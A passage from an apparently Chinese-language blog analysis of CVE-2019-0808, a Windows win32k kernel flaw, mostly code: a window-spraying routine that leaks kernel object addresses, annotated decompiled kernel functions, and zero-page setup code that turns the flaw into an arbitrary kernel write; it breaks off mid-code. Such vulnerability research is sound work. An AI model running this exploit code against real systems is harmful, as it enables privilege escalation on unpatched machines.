src="/2019/10/10/CVE-2019-0808详细分析/51.png"><p>窗口喷射主要是创建非常多的窗口，来获取窗口的tagWND，找到tagWND的地址靠的比较近的2个窗口。将需要通过xxxMNSetGapState修改的地址保存到addressToWrite，也就是hPrimaryWindow的tagWND.cbwndExtra，偏移为tagWND+0x90。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">sprayWindows</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HWND hwndSprayHandleTable[<span class="number">0x100</span>]; </span><br><span class="line">WNDCLASSEXW sprayClass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">sprayClass.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEXW);</span><br><span class="line">sprayClass.lpszClassName = TEXT(<span class="string">"_rand_str_sprayWindowClass"</span>);</span><br><span class="line">sprayClass.lpfnWndProc = sprayWndProc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (RegisterClassExW(&amp;sprayClass) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] Couldn't register the sprayClass class!\r\n"</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建 0x100 个窗口</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">hwndSprayHandleTable[i] = CreateWindowExW(<span class="number">0</span>, sprayClass.lpszClassName, TEXT(<span class="string">"spray"</span>), <span class="number">0</span>, </span><br><span class="line">CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历每一个窗口句柄</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; <span class="number">0x100</span>; x++) &#123;</span><br><span class="line"><span class="comment">// 通过 HmValidateHandle 获取载体窗口对象的 tagWND 内核地址</span></span><br><span class="line"><span class="comment">// 窗口对象 tagWND 的头部结构是一个 THRDESKHEAD 成员结构体对象</span></span><br><span class="line">THRDESKHEAD *firstEntryDesktop = (THRDESKHEAD *)pHmValidateHandle(hwndSprayHandleTable[x], TYPE_WINDOW);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 其中结构体 DESKHEAD 的成员域 pSelf 指向所属用户对象的内核首地址</span></span><br><span class="line"><span class="comment">// 因此通过该指针加上 tagWND 结构体的大小定位到当前窗口对象的扩展区域的内核地址</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> firstEntryAddress = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)firstEntryDesktop-&gt;pSelf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> y = <span class="number">0</span>; y &lt; <span class="number">0x100</span>; y++) &#123;</span><br><span class="line"><span class="keyword">if</span> (x == y) &#123;</span><br><span class="line"><span class="comment">// 跳过和自己的比较</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">THRDESKHEAD *secondEntryDesktop = (THRDESKHEAD *)pHmValidateHandle(hwndSprayHandleTable[y], TYPE_WINDOW);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> secondEntryAddress = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)secondEntryDesktop-&gt;pSelf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (firstEntryAddress &gt; secondEntryAddress) &#123;</span><br><span class="line"><span class="keyword">if</span> ((firstEntryAddress - secondEntryAddress) &lt; <span class="number">0x3fd00</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Primary window address: 0x%08X\r\n"</span>, secondEntryAddress);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Secondary window address: 0x%08X\r\n"</span>, firstEntryAddress);</span><br><span class="line">hPrimaryWindow = hwndSprayHandleTable[y];</span><br><span class="line">primaryWindowAddress = secondEntryAddress;</span><br><span class="line">hSecondaryWindow = hwndSprayHandleTable[x];</span><br><span class="line">secondaryWindowAddress = firstEntryAddress;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ((secondEntryAddress - firstEntryAddress) &lt; <span class="number">0x3fd00</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Primary window address: 0x%08X\r\n"</span>, firstEntryAddress);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Secondary window address: 0x%08X\r\n"</span>, secondEntryAddress);</span><br><span class="line">hPrimaryWindow = hwndSprayHandleTable[x];</span><br><span class="line">primaryWindowAddress = firstEntryAddress;</span><br><span class="line">hSecondaryWindow = hwndSprayHandleTable[y];</span><br><span class="line">secondaryWindowAddress = secondEntryAddress;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hPrimaryWindow != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Found target windows!\r\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hPrimaryWindow == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] Couldn't find the right windows for the tagWND primitive. Exiting....\r\n"</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set addressToWrite to primaryWindow's cbwndExtra field.</span></span><br><span class="line">addressToWrite = (UINT)primaryWindowAddress + <span class="number">0x90</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 确保第二个窗口是正常的</span></span><br><span class="line"><span class="keyword">if</span> (SetWindowTextW(hSecondaryWindow, <span class="string">L"test second"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[!] Something is wrong, couldn't initialize the text buffer in the secondary window....\r\n"</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="xxxMNUpdateDraggingInfo条件构造"><a href="#xxxMNUpdateDraggingInfo条件构造" class="headerlink" title="xxxMNUpdateDraggingInfo条件构造"></a>xxxMNUpdateDraggingInfo条件构造</h4><blockquote><p>0x34 =&gt; addressToWriteTo<br>0x4c =&gt; secondAddress<br>0x50 =&gt; 0xFFFF…</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">xxxMNUpdateDraggingInfo</span><span class="params">(tagMENUSTATE *pMENUSTATE, <span class="keyword">int</span> a2, <span class="keyword">int</span> uDraggingIndex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tagMENUSTATE *pMENUSTATE_; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> *pfnid; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> ptagMenuWND; <span class="comment">// eax</span></span><br><span class="line">  tagPOPUPMENU *pPOPUPMENU; <span class="comment">// ebx</span></span><br><span class="line">  tagITEM *pItem; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> a_minus_num; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> unkown_value; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> fnid_2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">bool</span> v14; <span class="comment">// zf</span></span><br><span class="line">  BOOL v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// [esp+8h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v18; <span class="comment">// [esp+Ch] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> fnid; <span class="comment">// [esp+14h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> uIndex; <span class="comment">// [esp+18h] [ebp-4h]</span></span><br><span class="line">  UINT uDraggingFlags_; <span class="comment">// [esp+24h] [ebp+8h]</span></span><br><span class="line">  tagITEM *pItem_copy; <span class="comment">// [esp+28h] [ebp+Ch]</span></span><br><span class="line"></span><br><span class="line">  pMENUSTATE_ = pMENUSTATE;</span><br><span class="line">  pfnid = (<span class="keyword">int</span> *)&amp;pMENUSTATE-&gt;uDraggingHitArea;</span><br><span class="line">  v5 = pMENUSTATE-&gt;uDraggingHitArea;</span><br><span class="line">  v17 = *((_DWORD *)gptiCurrent + <span class="number">45</span>);</span><br><span class="line">  *((_DWORD *)gptiCurrent + <span class="number">45</span>) = &amp;v17;</span><br><span class="line">  v18 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">    ++*(_DWORD *)(v5 + <span class="number">4</span>);</span><br><span class="line">  fnid = *pfnid;</span><br><span class="line">  uIndex = pMENUSTATE-&gt;uDraggingIndex;</span><br><span class="line">  uDraggingFlags_ = pMENUSTATE-&gt;uDraggingFlags &amp; <span class="number">3</span>;</span><br><span class="line">  LockMFMWFPWindow(pfnid, a2);</span><br><span class="line">  v6 = *pfnid;</span><br><span class="line">  pMENUSTATE_-&gt;uDraggingIndex = uDraggingIndex;</span><br><span class="line">  <span class="keyword">if</span> ( !IsMFMWFPWindow(v6) || (ptagMenuWND = safe_cast_fnid_to_PMENUWND(*pfnid)) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *pfnid = <span class="number">0</span>;</span><br><span class="line">    pMENUSTATE_-&gt;uDraggingIndex = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> ThreadUnlock1();</span><br><span class="line">  &#125;</span><br><span class="line">  pPOPUPMENU = *(tagPOPUPMENU **)(ptagMenuWND + <span class="number">0xB0</span>);</span><br><span class="line">  pItem = MNGetpItem(*(tagPOPUPMENU **)(ptagMenuWND + <span class="number">0xB0</span>), pMENUSTATE_-&gt;uDraggingIndex);<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// pItem = MNGetpItem(pPOPUPMENU, a3);</span></span><br><span class="line">  pMENUSTATE_-&gt;uDraggingFlags = <span class="number">0</span>;</span><br><span class="line">  pItem_copy = pItem;</span><br><span class="line">  <span class="keyword">if</span> ( pItem )</span><br><span class="line">  &#123; </span><br><span class="line">   <span class="comment">// pPOPUPMENU-&gt;spmenu = NULL</span></span><br><span class="line">   <span class="comment">// MNGetpItemFromIndex的第二个参数为*(DOWRD*)0x4C</span></span><br><span class="line">   <span class="comment">// 为了让MNGetpItemFromIndex返回值为方便控制的地址，我们希望它返回在零页面地址上</span></span><br><span class="line">   <span class="comment">// 从而轻松的控制这里判断中参与运算的一部分，内部返回值计算为：</span></span><br><span class="line">   <span class="comment">// result = *(_DWORD *)(null + 0x34) + 0x6C * uIndex;</span></span><br><span class="line">   <span class="comment">// 这里我们希望返回为0x100000180，由于只有4字节，最高位的1会去掉，从而变成0x180。-&gt;yItem 再取+0x28偏移处的值。</span></span><br><span class="line">   <span class="comment">// 所以我们0x4C的值应该满足 (*(DWORD*)0x34) + (*(DWORD*)0x4C)*0x6C = 0x100000180</span></span><br><span class="line">   <span class="comment">// 也就是代码中的</span></span><br><span class="line">   <span class="comment">// UINT secondAddress = ((0x100000180 - addressToWriteTo) / 0x6C);</span></span><br><span class="line">   <span class="comment">// 为什么不控制成其他的值呢？比如让其返回为0，如果这样，则</span></span><br><span class="line">   <span class="comment">// UINT secondAddress = (( - addressToWriteTo) / 0x6C);</span></span><br><span class="line">   <span class="comment">// 从而让-&gt;yItem取0x28偏移处的值（secondAddress就成了负数，不可以）</span></span><br><span class="line">    a_minus_num = MNGetpItemFromIndex(pPOPUPMENU-&gt;spmenu, pPOPUPMENU-&gt;spmenu-&gt;iTop)-&gt;yItem</span><br><span class="line">                + pMENUSTATE_-&gt;ptMouseLast.y</span><br><span class="line">                - *(_DWORD *)(*pfnid + <span class="number">0x54</span>);   <span class="comment">// </span></span><br><span class="line">   <span class="comment">// pPOPUPMENU-&gt;spmenu = NULL</span></span><br><span class="line">   <span class="comment">// pPOPUPMENU-&gt;spmenu-&gt;iTop = *(DWORD*)0x4C  =&gt; secondAddress</span></span><br><span class="line">   <span class="comment">// MNGetpItemFromIndex(pPOPUPMENU-&gt;spmenu, pPOPUPMENU-&gt;spmenu-&gt;iTop)-&gt;yItem = *(DWORD*)(0x180+0x28) = 0xf0f0f0f0 （负数还是很大的整数？）</span></span><br><span class="line">   <span class="comment">// ((pMenuState-&gt;ptMouseLast.y - pMenuState-&gt;uDraggingHitArea-&gt;rcClient.top) + pItemFromIndex-&gt;yItem) &gt; (pItem-&gt;yItem + SYSMET(CYDRAG))</span></span><br><span class="line">    unkown_value = pItem_copy-&gt;yItem;</span><br><span class="line">   <span class="comment">// 通过构造条件，始终进入分支 pMENUSTATE_-&gt;uDraggingFlags = 1;  </span></span><br><span class="line">   <span class="comment">// 这里要注意的是，原作者和网上都是分析的，0xf0f0f0f0是个足够大的数，</span></span><br><span class="line">   <span class="comment">// 从而始终可以进入pMENUSTATE_-&gt;uDraggingFlags = 2;分支</span></span><br><span class="line">   <span class="comment">// 然而我测试了将 0x50 后的内存分别覆盖为0xff，0x7f，0x80，0x00，</span></span><br><span class="line">   <span class="comment">// 0x7f也是足够的的整数了，所以这里其实是有符号整数比较，0x7f不行的原因就是太大了，进入了=2的分支。</span></span><br><span class="line">   <span class="comment">// 0xff，0x7f，0x00可以，是因为是负数，或者足够小！</span></span><br><span class="line">    <span class="keyword">if</span> ( a_minus_num &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)(unkown_value + *(_DWORD *)(gpsi + <span class="number">0x6E4</span>)) )<span class="comment">// </span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a_minus_num &gt;= (<span class="keyword">signed</span> <span class="keyword">int</span>)(unkown_value + pItem_copy-&gt;cyItem - *(_DWORD *)(gpsi + <span class="number">0x6E4</span>)) )</span><br><span class="line">        pMENUSTATE_-&gt;uDraggingFlags = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      pMENUSTATE_-&gt;uDraggingFlags = <span class="number">1</span>;          <span class="comment">// </span></span><br><span class="line">      <span class="comment">// pMENUSTATE_-&gt;uDraggingFlags 不能为0，为0则进入xxxMNSetGapState后不能进行或运算</span></span><br><span class="line">      <span class="comment">// 通过测试0x4C处的值，发现构造的比较值是个较小的数或负数，从而始终进入这个分支</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  fnid_2 = fnid;</span><br><span class="line">  <span class="keyword">if</span> ( fnid != *pfnid )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  v13 = pMENUSTATE_-&gt;uDraggingIndex - uIndex;</span><br><span class="line">  <span class="keyword">if</span> ( v13 == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( pMENUSTATE_-&gt;uDraggingFlags == <span class="number">2</span> &amp;&amp; uDraggingFlags_ == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> ThreadUnlock1();</span><br><span class="line">    v15 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( pMENUSTATE_-&gt;uDraggingIndex == uIndex )</span><br><span class="line">  &#123;</span><br><span class="line">    v15 = uDraggingFlags_ != pMENUSTATE_-&gt;uDraggingFlags;</span><br><span class="line">LABEL_20:</span><br><span class="line">    v14 = v15 == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v13 != <span class="number">1</span> || pMENUSTATE_-&gt;uDraggingFlags != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">  v14 = uDraggingFlags_ == <span class="number">2</span>;</span><br><span class="line">LABEL_21:</span><br><span class="line">  <span class="keyword">if</span> ( !v14 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_22:</span><br><span class="line">    pMENUSTATE_-&gt;uDraggingFlags |= <span class="number">4u</span>;</span><br><span class="line">    <span class="comment">// 第四个参数为0，不能进入或运算</span></span><br><span class="line">    xxxMNSetGapState(fnid_2, uIndex, uDraggingFlags_, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 第四个参数为1，才能进入里面的或运算</span></span><br><span class="line">    xxxMNSetGapState(*pfnid, pMENUSTATE_-&gt;uDraggingIndex, pMENUSTATE_-&gt;uDraggingFlags, <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ThreadUnlock1();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>windbg调试证明也是进入的pMENUSTATE_-&gt;uDraggingFlags = 1;分支：</p><img src="/2019/10/10/CVE-2019-0808详细分析/52.png"><h4 id="MNGetpItemFromIndex条件构造"><a href="#MNGetpItemFromIndex条件构造" class="headerlink" title="MNGetpItemFromIndex条件构造"></a>MNGetpItemFromIndex条件构造</h4><blockquote><p>0x20 =&gt; 0xFFFFFFFF</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">stdcall <span class="title">MNGetpItem</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  result = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a1 )</span><br><span class="line">    result = MNGetpItemFromIndex(*(_DWORD *)(a1 + <span class="number">0x14</span>), a2);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">tagITEM *__<span class="function">stdcall <span class="title">MNGetpItemFromIndex</span><span class="params">(tagMENU *pMENU, <span class="keyword">unsigned</span> <span class="keyword">int</span> uIndex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tagITEM *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( uIndex == <span class="number">-1</span> || uIndex &gt;= pMENU-&gt;cItems )<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// 为了不让每次的返回结果为0，让uIndex和最大的UINT比较，始终进入else分支</span></span><br><span class="line">                                                <span class="comment">// pMENU-&gt;cItems = *(DWORD*)0x20 = 0xffffffff</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = &amp;pMENU-&gt;rgItems[uIndex];           <span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// result = *(_DWORD *)(null + 0x34) + 0x6C * uIndex;</span></span><br><span class="line">                                                <span class="comment">// 注意这里返回的是0x34中的值 +0x6C*uIndex</span></span><br><span class="line">                                                <span class="comment">// 所以往0x34中放入主窗口的cbwndExtra偏移时，要-0x6C*uIndex</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="条件构造代码"><a href="#条件构造代码" class="headerlink" title="条件构造代码"></a>条件构造代码</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// xxxMNUpdateDraggingInfo 函数获得窗口对象后，会通过 MNGetpItem 函数访问其成员 tagPOPUPMENU 对象。</span></span><br><span class="line"><span class="comment">// MNGetpItem 函数又会继续访问 tagPOPUPMENU 对象的 spmenu 成员，从而造成零指针解引用漏洞。</span></span><br><span class="line"><span class="function">LRESULT WINAPI <span class="title">SubMenuProc</span><span class="params">(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (msg == WM_MN_FINDMENUWINDOWFROMPOINT) &#123;</span><br><span class="line"><span class="comment">// 拦截 MN_FINDMENUWINDOWFROMPOINT 消息, 返回触发漏洞的 hWndFakeWindow</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] In WM_MN_FINDMENUWINDOWFROMPOINT handler...\r\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*] Update window[%p] proc to DefWindowProc \n"</span>, hwnd);</span><br><span class="line">SetWindowLongW(hwnd, GWLP_WNDPROC, (ULONG)DefWindowProc);</span><br><span class="line"></span><br><span class="line">UINT uIndex = wParam + <span class="number">0x10</span>; <span class="comment">// 这里没弄清楚是在哪里要减0x10，导致这里要加上去</span></span><br><span class="line">UINT addressToWriteTo = ((addressToWrite + <span class="number">0x6C</span>) - (uIndex * <span class="number">0x6C</span>) - <span class="number">0x4</span>);</span><br><span class="line"><span class="comment">// 由于写入地址会先在MNGetpItemFromIndex中进行运算，将参与运算的写入地址进行相应的计算</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// -0x4，是由于xxxMNSetGapState函数进行运算时，会取fState的偏移+0x4</span></span><br><span class="line"><span class="comment">// pItem_copy-&gt;fState |= 0x40000000u;  =&gt; *((DWORD*)pItem_copy + 0x4) |= 0x40000000u</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// -(uIndex * 0x6C)，是由于MNGetpItemFromIndex返回的是0x34中的地址+0x6C*uIndex</span></span><br><span class="line"><span class="comment">// result = *(_DWORD *)(null + 0x34) + 0x6C * uIndex;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// +0x6C 是因为在xxxMNSetGapState中，调用MNGetpItem时，对uIndex减了1</span></span><br><span class="line"><span class="comment">// ptagITEM_2 = MNGetpItem(spPopupMenu_1, uIndex - 1);</span></span><br><span class="line"></span><br><span class="line">memcpy_s((<span class="keyword">void</span>*)<span class="number">0x20</span>, <span class="number">4</span>, <span class="string">"\xFF\xFF\xFF\xFF"</span>, <span class="number">4</span>);</span><br><span class="line"><span class="comment">// MNGetpItemFromIndex中，为了不让每次的返回结果为0，让uIndex和最大的UINT比较，始终进入else分支</span></span><br><span class="line"></span><br><span class="line">memcpy_s((<span class="keyword">void</span>*)<span class="number">0x34</span>, <span class="number">4</span>, &amp;addressToWriteTo, <span class="number">4</span>);</span><br><span class="line"><span class="comment">// xxxMNSetGapState中第一次调用MNGetpItem，返回运算地址，就是从0x34中取出来进行运算的</span></span><br><span class="line"></span><br><span class="line">UINT secondAddress = ((<span class="number">0x100000180</span> - addressToWriteTo) / <span class="number">0x6C</span>);</span><br><span class="line">memcpy_s((<span class="keyword">void</span>*)<span 